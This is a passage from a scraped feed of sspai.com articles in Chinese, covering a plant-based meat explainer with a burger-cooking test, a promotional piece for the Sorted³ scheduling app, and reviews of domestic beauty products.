href=\"https://uploads.strikinglycdn.com/files/aebcfa4f-9f55-4a0f-931b-004c98160867/GFI_(CN)Plant-Based-Meat-Manufacturing-Guide.pdf\" target=\"_blank\">报告</a>。主要工艺流程包括这么几步：</p>\n<ol>\n<li>获取蛋白原料，比较常见的是通过大豆和豌豆。大豆胜在价格便宜，豌豆则胜在不容易过敏，所以豌豆其实使用得更广泛一些。</li>\n<li>将蛋白原料混合一些其他辅料，如水、脂肪、一些调味料和食用色素香精等。这一步会影响植物肉最终的风味和外观，有的公司会选择加入甜菜汁，有的公司则会选择加入一些血红蛋白模拟颜色。</li>\n<li>通过特制的挤压机（这么一台机器得千万人民币），将蛋白原料挤压出特殊的纤维，再经过一些工艺固化，就和真正的肉「相差无几」了。</li>\n</ol>\n<p>PS：国内为植物肉提供豌豆蛋白的最大的厂家双塔食品，其实最开始是做粉丝的（他们家的龙口粉丝你大概听说过吧），豌豆蛋白只是副产品。</p>\n<h2>植物肉的优势</h2>\n<p>从前面的介绍可以看到，相比传统的农业和畜牧业，植物肉作为一种全新的食品工业分类，有着不少工业带来的优势。</p>\n<h3>产品优势</h3>\n<p>按照各家植物肉厂商的宣传，植物肉对消费者的优点主要有以下几个：</p>\n<ol>\n<li>热量更低；</li>\n<li>脂肪更少：毕竟都是植物蛋白合成的；</li>\n<li>更多的膳食纤维；</li>\n<li>蛋白质比例更多：水分比动物肉更低，所以蛋白质比例就更高了；</li>\n<li>相对卫生：对比传统农业生产，有可能会会用到一些激素或者抗生素，甚至还会有什么瘦肉精；植物肉只需要工厂打开机器就可以了，产品中不仅没有抗生素，细菌的含量也更容易控制。</li>\n</ol>\n<h3>环保</h3>\n<p>除以上提到的产品优点之外，<strong>环保</strong>也是各大厂商的主要宣传点之一。</p>\n<p>相比传统农业的生产方式，通过工业生产一公斤的植物肉，需要消耗的水、粮食，以及带来的温室气体都要少很多。</p>\n<p>援引 <a href=\"https://finance.sina.com.cn/tech/2021-05-11/doc-ikmyaawc4557770.shtml\" target=\"_blank\">这篇文章</a> 的配图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mp6vlb34tcu4bur1hg.jpeg\"></figure><p>植物肉消耗的水仅是传统农业的 0.5%，温室气体仅是传统农业的 10.3%。考虑到一头牛的一年产生的温室气体，光二氧化碳就 3 吨之多，还不含甲烷等气体。如果真的能替代一部分畜牧业产量，植物肉可能真的能给环保贡献一些力量。</p>\n<h3>潜在商业价值</h3>\n<p>抛开公开宣传的这些点，我认为，植物肉厂商的投入，主要是因为这个业务能提供更多的潜在商业价值：</p>\n<ol>\n<li>成本：随着工艺进步，以及规模优势，成本持续降低。Beyond Meat 16 年的生产成本还在 5.6 美元每磅，到了 19 年的成本就降到了 4.3 美元每磅。</li>\n<li>稳定生产：不用担心猪肉周期或者牛肉周期（大家还记得前两年猪肉价格突破天级的时候么），更不用担心猪瘟或者疯牛病这一类突发性事件。</li>\n<li>距离更近：工厂可以直接建在城市附近，而不用从牧场运过来，对于大城市来说，能节省不少冷链运输成本。</li>\n<li>更适合二次加工肉制品：对，这里是说的大家常吃的火腿肠或者鸡块，这种本来就是肉糜制作的肉制品，植物肉制作起来更加方便（毕竟省了一道工序）。</li>\n</ol>\n<h2>植物肉的发展前景</h2>\n<p>说到这里，想起前一段时间回形针和赛雷三分钟掀起的那场论战，起因就是有一起节目，里面提到：因为中国人要吃肉-&gt;向国外进口大豆养动物-&gt;南美洲要开辟土地种大豆-&gt;亚马逊雨林这样的逻辑链。这件事已经被各路人士批判过很多次了，具体原因我就不再赘述，感兴趣的可以看 <a href=\"https://www.bilibili.com/video/BV17v411W7fm\" target=\"_blank\">这期视频</a>。</p>\n<h3>在中国的短期前景</h3>\n<p>先说我个人的结论：仅从替代动物肉的角度上来讲，植物肉在中国前景不大。</p>\n<h4>饮食结构</h4>\n<p>在其实从饮食习惯上来说，中国人很久之前就获取了直接从植物中获取优质蛋白质的路径，那就是黄豆的转化——豆制品，这是数千年的智慧结晶。</p>\n<p>除了便于获取奶制品的草原地区之外，几乎所有的地区都有在利用黄豆制作食物的习惯。各种各样的豆腐、豆花、豆浆、豆皮、腐竹等等等。</p>\n<h4>环保问题</h4>\n<p>中国人的餐桌上，最多的肉类是猪肉和鸡肉，这两种肉类的对环境的影响比牛肉更少。</p>\n<p>毕竟牛是出肉率相对较低的动物了，生产 1 公斤牛肉消耗的粮食能生产 2 公斤的猪肉或者更多的鸡肉。</p>\n<p>既然本来牛肉吃的就不多，似乎对这个环保诉求就没有那么强。反倒是年均肉消耗量是中国人七倍的美国市场，植物肉的市场前景可能更大一些吧。</p>\n<h3>未来的发展前景</h3>\n<p>这一点上我是很乐观的，在太空场景以及很难发展畜牧业的地方，通过植物肉或者培育肉产出人工肉来改善饮食条件是一个很有想象力的方向。</p>\n<p>想象一下：</p>\n<p>在飞向 X 光年外的移民飞船上，一边是吸收太阳光生长的大豆培育仓，另一边是通过太阳能供电的食品生产系统，维持着船员的饮食需要。船员 Alpha 拿着餐盘到取餐机器下，然后机器轰鸣，将一块人造肉排制造加工并放到 Alpha 的餐盘上。</p>\n<p>Alpha 一边看着窗外无垠的太空，一边品尝盘中的食物，试图回忆起几光年之外那颗蓝色星球上的儿时风味。</p>\n<h2>植物肉好吃吗？</h2>\n<p>植物肉无论优势再怎么多，也是一种食物，只要端到餐桌上的，好不好吃才是硬道理。</p>\n<p>烹饪方式、风味、口感都是很重要的评价要素，为了体验植物肉目前的水平，我在天猫上下单购买了两包雀巢旗下的「嘉植肴」品牌的素猪肉馅来制作汉堡。雀巢也是植物肉投入比较多的厂商，旗舰店里每款产品月销都在 400 件左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/4615af6cd9700f314d4d38751e2fa248.jpg\"><figcaption>注意看包装上的示意图，以及下面实际的区别</figcaption></figure><p>肉馅的价格是每袋 226g，约 30 元。我搜集了几个平台的肉馅价格，可以看出植物肉馅价格还是远远高于普通肉馅的，甚至比牛肉的价格都还要高。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td> </td>\n<td>价格</td>\n<td>折合 500g 价格</td>\n</tr>\n<tr>\n<td>嘉植肴素猪肉馅</td>\n<td>226g / 30元</td>\n<td>66</td>\n</tr>\n<tr>\n<td>美团买菜-瘦猪肉馅</td>\n<td>300g / 10.1 元</td>\n<td>16.8</td>\n</tr>\n<tr>\n<td>盒马生鲜-日日鲜前腿肉馅</td>\n<td>300g / 9.8 元</td>\n<td>16.3</td>\n</tr>\n<tr>\n<td>物美超市-精瘦肉馅</td>\n<td>300g / 9.9 元</td>\n<td>16.5</td>\n</tr>\n<tr>\n<td>盒马生鲜-月盛斋牛肉馅</td>\n<td>280g / 24.8 元</td>\n<td>44.2</td>\n</tr>\n</tbody></table></figure><h3>需要准备的原料</h3>\n<p>和吃堡了吗第一期相比，这次稍微偷懒了一下，汉堡坯买的现成的，酱汁也选择了市售的番茄酱。</p>\n<p><strong>汉堡胚</strong>：直接购买现成的就行，如果为了快可以在附近的盒马找一找。</p>\n<p><strong>肉馅：</strong></p>\n<ul>\n<li>绞肉：250g，这里我们选用了刚才购买的素猪肉馅；</li>\n<li>鸡蛋：50g（约一枚）；</li>\n<li>黄洋葱：100g，可以多切一些，最后用不上的可以做其他菜；</li>\n<li>面粉：30g；</li>\n<li>牛奶：30ml；</li>\n<li>盐：2g；</li>\n<li>黑胡椒：1g。</li>\n</ul>\n<p><strong>配菜：</strong>西红柿切薄片，生菜撕碎，酸黄瓜切片，番茄酱。</p>\n<h3>汉堡肉的制作</h3>\n<p>在北美地区，「burger」一词更多的指的是内夹牛绞肉饼的三明治<sup class=\"ss-footnote\" href=\"\" title=\"https://zh.wikipedia.org/wiki/%E6%BC%A2%E5%A0%A1%E5%8C%85\" footnote-id=\"3\">3</sup>。不过我们毕竟用的是植物肉，也无所谓到底是哪种绞肉了。</p>\n<p>制作汉堡肉可以使用纯肉来制作，也就是把绞肉用手团一团，压成和面包差不多的肉饼，然后放到锅中煎熟。</p>\n<p>但是为了获得更加丰富的口感和汁水，会在肉馅中加入其他的辅料，这里参考了我喜欢的一个UP主「芥末的小厨房」<a href=\"https://mp.weixin.qq.com/s/U9uNCrBHqdDCmeodlsyd4A\" target=\"_blank\">视频中的方子</a>：</p>\n<blockquote><p>🍔️ 肉馅+鸡蛋+熟洋葱碎+面粉+牛奶+盐+黑胡椒</p></blockquote>\n<p>这个方子里面，各个配料各司其职：鸡蛋是改善口感的，熟洋葱碎是提供甜味和香气的，面粉和牛奶是提供更多汁水的，盐和黑胡椒是一个基本调味。</p>\n<p>把洋葱细细切碎，用小火把洋葱炒到透明加一点点焦黄色最合适，这个状态的洋葱充满了美拉德反应的香气，好极了！</p>\n<p>温馨提醒：</p>\n<blockquote>\n<p>🍔️ 如果鸡蛋比较大，超过50g的比例，可以对应的减少牛奶的量。</p>\n<p>🍔️ 如果肉馅里水分本来就比较大，也可以适当调整面粉和牛奶比例。</p>\n<p>🍔️ 熟洋葱记得要放凉了再拌到肉馅里，不然有可能把鸡蛋弄熟了。</p>\n</blockquote>\n<p>把上述所有馅料全部放到一个大碗中，用筷子或者手持续一个方向搅拌，让肉馅「上劲」，其实就是重构了纤维网络，在肉馅中锁住了更多的水分。</p>\n<p>取出适量肉馅，我这里是把肉馅分成了四块。在手里团一团，捏成合适的大小就可以准备下一步了。手法操作可以看看《食戟之灵》中的 <a href=\"https://www.bilibili.com/video/BV1yx411V7Xr/\" target=\"_blank\">这一段</a>。</p>\n<h3>实际操作：第一步就翻车</h3>\n<p>大家看上一节我侃侃而谈，是不是觉得还挺顺利，其实并不是。</p>\n<p>解冻了植物肉馅之后，我把肉馅从袋子里取出来，第一眼我就惊了。</p>\n<p>这根本已经是成型的肉饼啊！</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4mp70db34tcuopj7tt0.jpeg\"></figure><p>考虑到别的配料已经准备好了，我就准备用筷子把肉馅打碎，结果发现无法打碎，这硬的和午餐肉似的……于是直接上手，大力出奇迹的把肉馅强行捏碎，光这一步就花了10分钟，才获得了一盆足够碎的肉馅（或者说是碎的午餐肉）。</p>\n<p>搅拌的时候发现了植物肉的另一个大问题：</p>\n<p><strong>这玩意不吸水！</strong>也就是根本无法上劲，搅拌十分钟也根本没有变化，整个馅还是流体……</p>\n<p>最后只能采取另一个方案：给馅料多加一点面粉，让拌好的肉馅有一定粘稠度。</p>\n<h3>下锅煎肉饼</h3>\n<p>由于上一步肉馅实在是不太行，这一步我就跳过了团肉饼的阶段，直接把馅料倒入平底锅中煎制。</p>\n<p>然后我遇到了第三个问题：</p>\n<p><strong>植物肉要煎成啥样才算熟？</strong></p>\n<p>如果是普通的肉饼：</p>\n<p>如果是普通肉馅，变色之后大概就知道熟度；只要一面变色之后，给肉饼翻面，翻面后就盖上锅盖，用小火把肉饼彻底焖熟。过个3分钟左右基本肉饼就全熟了。</p>\n<p>如果锅里没有肉汁出来，也可以稍微撒点水。</p>\n<p>对于植物肉的肉饼：</p>\n<p>……这植物肉下到锅里面，根本没有变化啊……颜色根本不发生变化。</p>\n<p>只能用锅铲轻轻地碰肉饼的边缘，如果有一点变硬，说明熟了一些。等到全部变硬，准备翻面的时候，我发现了一个可怕的情况：植物肉的肉饼完全没有肉汁，一点都没有。</p>\n<p>不仅仅煎肉饼火候判断比之前难了好几倍，而且我也能想象到最后的口感大概是多么令人窒息了。</p>\n<p>最后算是煎出来四个肉饼，用手按压肉饼，也不出所料的没有任何肉汁渗出来。</p>\n<h3>组装汉堡</h3>\n<p>按照配料表把所有的东西都准备好：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mp70lb34tcuopj7ttg.jpeg\"><figcaption>是的，左上角那个就是植物肉肉饼</figcaption></figure><p>这一个汉堡结构比上一次的炸厚牛排简单多了，采用一个双层肉饼结构：</p>\n<blockquote><p>汉堡盖子 - 酱汁 - 西红柿 - 肉饼 A - 芝士片 - 肉饼 B - 酸黄瓜 - 生菜丝 - 汉堡底</p></blockquote>\n<p>按照这个结构组合一下也就完成了。如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/779dad4e685a3432ffed99b11472b00d.jpg\"></figure><h3>结论：植物肉汉堡不太好吃</h3>\n<p>实话说，不太好吃。核心问题就是植物肉的结构和普通肉馅差别太大了，做完之后一口咬下，完全没有汁水，少了肉的口感。</p>\n<p>由于担心是不是我之前画蛇添足的制作了肉饼。第二天我又做了一次，这次没有把肉饼搅碎，而是完整的下锅煎熟。结果一样没有肉汁和口感，是我多虑了。</p>\n<p>说到这里有点后悔之前肯德基出植物肉汉堡的时候没有去体验下，不知道他们是怎么处理的。</p>\n<p>另外得吐槽一点，这个植物肉的状态和封面上区别实在是有点大，包装上看起来像是肉馅，里面却像一块午餐肉。不知道其他品牌的植物肉是不是也是这个状态</p>\n<p>综上所述，喜欢汉堡和汉堡肉的朋友们，似乎可以再观望一下，看植物肉什么时候能进化到口感可以以假乱真吧。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67777\" target=\"_blank\">给还在找减重方法的你：生酮饮食真的值得尝试吗？</a></li>\n<li><a href=\"https://sspai.com/post/67831\" target=\"_blank\">三点几了，喝杯果蔬汁解忧愁吧</a></li>\n<li><a href=\"https://sspai.com/post/64103\" target=\"_blank\">如何辨别「好食物」与「坏食物」</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68547"},{"title":"限时福利｜高效管理你的一天，Sorted³ 工具升值包上架。","date":"2021-09-05 03:00:00","description":"\n<p>🧧文末有评论送码福利，不要错过！</p>\n<hr>\n<p>有没有这样一种可能，用来解决拖延症的工具 —— 待办清单 —— 可能恰恰是造成拖延症的原因之一。</p>\n<p>前苏联心理学家 <a href=\"https://zh.wikipedia.org/wiki/%E5%B8%83%E7%9B%A7%E7%91%AA%C2%B7%E8%94%A1%E5%8A%A0%E5%B0%BC%E5%85%8B\" target=\"_blank\">布卢玛·蔡加尼克</a> 在实验中发现：相较于已经完成的工作，人们比较容易记得未完成的，或是被打断的工作。反映在日常生活中，人们总是会对待办事项「耿耿于怀」，于是走向两个极端：要么一鼓作气清空待办清单，要么对着长长的清单持续焦虑，演变成拖延症。</p>\n<p>用待办清单做任务管理的弊端不仅如此：</p>\n<ul>\n<li>规划任务时不断在日历、日程和时间线之间切换；</li>\n<li>添加新任务或计划有变时，不断调整列表里的任务顺序或分组；</li>\n<li>过度计划而反而造成了时间浪费；</li>\n<li>……</li>\n</ul>\n<span class=\"ss-genuineSoftware\" product-id=\"282\" type=\"genuineSoftware\"> </span><h2>Sorted³ 如何高效管理你的一天</h2>\n<p>各类任务管理工具的开发者们也意识到了这些问题，于是在自己产品中，用不同的方式做出应对：OmniFocus 延续清单的概念，但是强调「透视」，把清单尽可能地根据情景切分；Things 强调任务的时间属性，辅以简洁优雅的设计。这是两种解决思路：要么把清单变短，要么把清单变顺眼。总之就是要尽可能减少待办事项带来的焦虑。</p>\n<p>而 Sorted³ 的办法，则是绕过「清单」，直达任务管理的核心：时间。</p>\n<p>相比任务管理工具把「清单」作为核心要素，Sorted³ 是以「时间计划」为核心。不只是任务清单，还包含何时做、做多久。</p>\n<p>通过「日历 + 时间线 + 任务 + 自动计划」，实现一天时间的高效管理。</p>\n<h3>收集与整理</h3>\n<p>任何形式的任务管理，都从收集和整理开始。Sorted³ 在侧边栏固定了「收件箱、计划、列表、标签」四个菜单来帮助你收集和整理任务。</p>\n<p>「收件箱」可以帮你收集一切有待完成的任务和日程。你可以在这里清空大脑，将所有任务塞进收件箱，用最快速、精简的记录方式开启任务管理的第一步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/article/648e7b71b8bbb9d13df0a40171bc7542\"><figcaption>收件箱</figcaption></figure><p>接下来你可以通过「列表」和「标签」厘清任务的不同属性，对它们进行组织和整理。</p>\n<p>「列表」就像文件夹，但如果只用文件夹的方式管理，文件会很容易越放越深，就会出现难以检索的问题，这时「标签」的作用就体现出来了。你可以根据 Sorted³ 提供的默认「列表」和「标签」设计一套属于自己的组织系统。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/01/eac939ba6a43f292f3a3156c63688221.png\"></figure><p>在 Sorted³ 的任一界面中，点击任务，即可对任务的属性进行整理，给任务设置规划日期、周期、开始时间、持续时间等等。其中最为重要的，就是设置日期。划动任务，动作栏中就会出现「日期」按钮，在弹出的日历中点击日期即可。</p>\n<p>最终，所有带有日期的任务，都会在 Sorted³ 操作的核心界面 ——「计划」中出现。乍看之下，计划只是一个根据日期分类任务的界面，类似其它应用中的「今日待办」。但其实 Sorted³ 的核心功能，全隐藏在这个界面之中。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/02/876a6dd9f959cb0b16c06b31a50b3e4c.png\"><figcaption>计划界面</figcaption></figure><h3>日程安排</h3>\n<p>不同于其他任务管理应用以 GTD 为底层方法论，Sorted³ 提出了自己的产品理念 —— Hyper-Scheduling。它的字面含义是「超调度」：超级日程调度。其理念的核心在于，以时间为核心来计划每天的任务列表，而不仅仅是列下待办清单。换句话说，任务清单在 Sorted³ 中升级为日程清单。</p>\n<p>Sorted³ 以日程为核心，而非任务。不断累积的任务会让人压力变大，越来越长的待办清单会让你在打开软件时心有余悸，在「放弃治疗」的边缘来回摇摆。而 Hyper-Scheduling 则聚焦时间维度，利用日程清单来分配精力，为不同的任务设置不同的持续时间，实现时间和精力双重管理。</p>\n<p>最终，在 Sorted³ 中，我们希望将任务能分配到合理的日程中，而不是待办清单中。</p>\n<p>Sorted³ 在「计划」菜单的界面中拥有「时间标尺」功能。通过在「时间标尺」进行滚动操作，来快速调整任务的开始时间，而不是点开任务之后再进行调整，通过简化步骤节省调整计划的时间。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/f6abb819a6156ad4ed1f71f0e88828df.gif\"><figcaption>通过时间标尺调整计划</figcaption></figure><p>为了加快操作的效率，Sorted³ 还设计了「魔术选择」特色功能，通过快速选择多个项目的手势操作方案，再结合「时间标尺」，批量修改任务时间，帮你实现高效任务重新排序的操作。当然，「魔术选择」的作用并不仅限于此，只要涉及批量操作都可以搭配使用。</p>\n<p>经过这一步，任务在 Sorted³ 中被转化为日程，解决了任务管理中最为核心的问题：「我现在应该做什么」。</p>\n<h3>自动计划</h3>\n<p>然而，如果一切只能手动进行，还算不上高效。</p>\n<p>在时间尺和魔术选择的基础之上，Sorted³ 开发了「自动计划」特色功能，可以在你任务过多、疲于安排时，帮你自动安排你的一天。只需配置好一天的开始时间和任务间隔，就可以实现类似课程表的快速计划。如果不满意「自动计划」的时间表，也可以借助「魔术选择」和「时间标尺」进行快速调整，省去冥思苦想和反复操作的时间，实现一天的快速规划。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/6f12965b0e4a91afc44d6f7c29092a77.gif\"><figcaption>自动计划</figcaption></figure><h3>重新组织</h3>\n<p>除了更快地日程规划、调整，Sorted³ 还提供了「重新组织」功能，也就是对大型任务进行再规划，协助用户将大任务细化为更易完成的一个个小任务，或是将过于琐碎的任务合并成一个。</p>\n<p>例如，会议结束后的任务和日程安排，通常要分开记录和完成，此时的重新组织就很有必要。借助「魔术选择」和「重新组织」的拖入框，便可以顺其自然地将大任务的不同节选部分切分为更易完成的小任务。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/01/95663fe552bba482134833232e3b942b.gif\"><figcaption>即使在手机上，也能快速的重新组织</figcaption></figure><p>此外，你还可以搭配 Shoutcut 建立自己的 URL Schemes、借助 Siri 等方式实现更高阶的高效操作自动化体验。</p>\n<p>通过以上的流程，我们始终围绕时间这个概念，对任务进行规划，关注「何时做何事」，而非「高效组织任务清单」，来帮助我们打破「蔡加尼克效应」。</p>\n<h2>Sorted³ 升值包里有什么</h2>\n<p>Sorted³ 工具升值包将包含：</p>\n<ul>\n<li>Sorted³ 高级会员（买断制）</li>\n<li>Sorted³ 定制内容</li>\n</ul>\n<p>关于高级会员具体权益，请前往官网 <a href=\"https://www.sortedapp.com/\" target=\"_blank\">查看</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/article/bf1d58ed6977576521971a1a2626daf6\"></figure><p>为了讲解关于 Sorted³ 的技巧，我们特地邀请了少数派作者 <a href=\"https://sspai.com/u/maybe009/updates\">@Voyager_1</a>，来为 Sorted³ 做一个全面且细致的介绍。</p>\n<p>在 Sorted³ 系列文章中，我们将通过四篇文章，从任务与日程的区分开始，一步步介绍如何利用 Sorted³ 的特色功能进行收集整理任务、计划日程，当计划有变时，如何重新组织你的日程，以及更高阶的自动化操作，并结合作者的实践经验，为你提供独家使用技巧和方案。</p>\n<h2><strong>限时特惠 &amp; 评论送码</strong></h2>\n<p>即日起至 9 月 9 号，将享受上架特惠 198 元。活动期间，在评论区分享你和 Sorted³ 的故事，我们将在 9 月 9 号，为一位读者送上 Sorted³ 工具升值包，还为两位读者赠送 Sorted³ 定制内容阅读权限。</p>\n<p>下单购买后，会在后台自动为您开启了定制内容的阅读权限（可能会有延迟，请耐心等待）。如果有任何相关问题可以私信 <a href=\"https://sspai.com/u/es8osc9d\" target=\"_blank\">@数字工具组</a>。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"282\" type=\"genuineSoftware\"> </span><p>&gt; 下载少数派 2.0 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall/class/28\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68557"},{"title":"国物馆 | 好看的睫毛可以让都市丽人一飞冲天","date":"2021-09-04 07:06:44","description":"\n<p>据《2019 中国消费品牌发展报告》显示，95 后对国货的认可超过进口品牌。2020 年中国品牌榜单指出，一些新锐国货从开天猫旗舰店到销售破亿的时间，最快已缩短至 7 个月。成长爆发力排名前五的品牌，超过半数的消费者都是 95 后人群。同样是 95 后的我，也不禁开始承认，所购用品中国货占比逐年增加，国货正在崛起。</p>\n<p>作为一个精致女孩，我的身边总是少不了各类美妆产品。过去我总是「迷信」于资生堂、兰蔻等国外品牌，直到今年我遇到了下面这些好用的国货美妆品，在实际使用过后，它们或多或少都给我带来了「惊艳」的感觉。</p>\n<h2>科丽尼青蒿头皮素</h2>\n<p>作为一个拥有细软发质的油头少女，我的头发在夏天必须一天一洗，只有周末不出门的时候，才敢尝试两天不洗头，至于三天不洗——那简直是狗都嫌弃😆。因此，我一直在寻找改善油性发质的洗发露，试图延缓头发变油的速度。</p>\n<p>在尝试过各种各样的产品后，我入手了今年在医美行业风很大的科丽尼青蒿头皮素。它宣称主要成分为青蒿、马齿苋、薄荷醇和合成神经酰胺，我并非专业成分党，对此不做评价，只谈谈我的使用感受。</p>\n<p>使用方法很简单：在第一次使用普通洗发水正常洗头后，将头皮素涂抹在发根头皮处揉搓至起泡，按摩三至五分钟，再冲洗干净，就能感受到「透心凉，心飞扬」的薄荷爽感，在夏天十分受用！最直观的使用效果是，头发变蓬松了，发根支棱起来了，待机时间有所延长，夏日炎炎确实可以做到两天不洗头——对我而言就已经达到目的了。</p>\n<p>至于官方宣称的「去屑止痒」功效，我建议有这类头皮健康烦恼的朋友还是第一时间前往三甲医院，寻求专业医生的帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/87cac5a756e0a06bdf8695a1d1906e13.jpg\"><figcaption>科丽尼青蒿头皮素</figcaption></figure><h2>泡菜博士焕彩赋能净妍精华</h2>\n<p>国际惯例，安利护肤品先报肤质：坐标深圳，混合肤质，夏天 T 区油，冬天 U 区干，早年不懂事把自己作成了红血丝敏感肌。</p>\n<p>20 岁过后护肤开始重视精华的作用，美白、抗皱、保湿功效都是刚需，同时还不能油腻闷痘，在某华中科技大学同济医学院的医生大 V 安利下，我买了这款精华回来试试。首先包装就很好看，黑色与明黄色相撞，在桌上很容易吸引本颜狗的目光，抽拉式包装盒质感不错，能二次利用收纳一些小物件，环保好感 +1。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/93fe59d0d823c500a2557762f65ae640.jpg\"><figcaption>泡菜博士焕彩赋能净妍精华</figcaption></figure><p>精华质地看着粘稠，没想到上脸相当清爽，吸收迅速不粘腻，带有淡淡的柑橘香气。第二天起床，脸部 T 区依旧干爽不泛油光，油皮亲妈<sup class=\"ss-footnote\" href=\"\" title=\"编注：指对油性肤质友好\" footnote-id=\"1\">1</sup> +1。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/15/9f1b788463d1b37b2d74c2a77bc85d71.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/15/2d8b2f2ab2d1732239cb41d78c8599bc.jpg\" alt=\"\"></figure><p>从功效来看，这款精华宣称添加美白舒缓常用成分 377、光果甘草根提取物，抗氧化成分白藜芦醇等，主打通过皮肤褪红和减少暗沉达到美白提亮的目的。我断断续续使用一个月下来，皮肤确实有变得更白皙透亮，出油状况也有所缓解，回购名单 +1。</p>\n<p>说实话，如果不是看到权威医生安利，看到这个名字，我可能会以为是某个微商三无产品。只能说国货护肤品牌路漫漫其修远兮，还需要自身品质够硬，才能撇除偏见吧。</p>\n<h2>Everbab 一飞冲天睫毛夹</h2>\n<p>如果说眼睛是心灵的窗户，那么眼睫毛就是大概就是装饰窗户的窗台，一双又卷又翘的睫毛不仅放大双眼，还能增加妆容精致感（此处应响起 BGM《睫毛弯弯》）。</p>\n<p>但是夹好睫毛真的不是一件容易的事情，本人内双 + 肿眼泡，夹睫毛很容易夹到眼皮，上至植村秀，下至无印良品，传说中各种有名的睫毛夹都用过，也没能夹出理想的「太阳花」睫毛。</p>\n<p>直到抱着试试看的心态买了这款睫毛夹，才知道什么叫做「一飞冲天」，这名字真的一点都不骄傲！我一个手残女孩，竟然在没有夹到肉的情况下，夹出了弧度美丽的「太阳花」睫毛，配合睫毛定型液能维持一天不塌，简直是神器！第一次使用完毕就激动地发微博为它打 call，每逢姐妹就想按头安利：一杯奈雪的价格，买不了吃亏买不了上当，买它！！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/e41c9098191365feb65d740fcdb0988c.png\"><figcaption>Everbab 一飞冲天睫毛夹</figcaption></figure><h2>贝根宝冷基发膜</h2>\n<p>大学四年下来，我的头发经历了各种染烫，发质已经大不如前。我原本以为把头发剪短就能让它焕发生机，但新长出来的头发依旧干燥、容易打结，像枯草一样暗淡，在使用过护发素和护发精油后也没能得到明显改善。</p>\n<p>想要电视广告里面乌黑油亮的发质，又不想耗费大量的时间精力金钱在 Tony 老师那里做护理，就只能自力更生了。跟 Tony 老师混熟后，从他那里了解到了这款冷基发膜，看在价格是做一次专业护理几分之一的情况下，果断下单买了一瓶。</p>\n<p>发膜到手后我只想说：太！大！了！这么大一罐，我要用到猴年马月呢 😂？发膜的使用方法非常省时省力：洗发后将发尾拧干，抹上适量发膜，静置五分钟后用水洗净，打开吹风筒就能收获一梳到底柔顺油亮的头发！这种立竿见影又省时省力的护发方式，简直是都市打工丽人的福音，性价比也优于日本的 fino 发膜，只想说声国货 🐂🍺！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/f3d86e7afced88fe9d5a1ae05a751111.jpg\"><figcaption>贝根宝冷基发膜</figcaption></figure><h2>贝芙雅眼膜</h2>\n<p>许多都市丽人化妆的时候都会遇到一个尴尬的现象——眼下粉底卡纹。至于为什么会卡纹？当然是因为干燥！无数个偷懒不涂眼霜的夜晚，早已为第一道干纹埋下伏笔……</p>\n<p>所幸的是，刚出现的干纹往往还处于「假性」阶段，做好补水保湿工作，仍能防患于未然。而我买贝芙雅眼膜的原因也很简单：安全低敏，国家「械」字号产品卫生等级更高；便宜大碗，折算下来一对眼膜不到一杯奶茶钱；补水显著，贴完眼膜再上粉底，确实不卡粉了。</p>\n<p>至于祛除黑眼圈、眼袋等功效，还是醒醒吧～才几块钱的东西，不能指望它做到这么多哦。</p>\n<figure class=\"image ss-img-wrapper\"><img 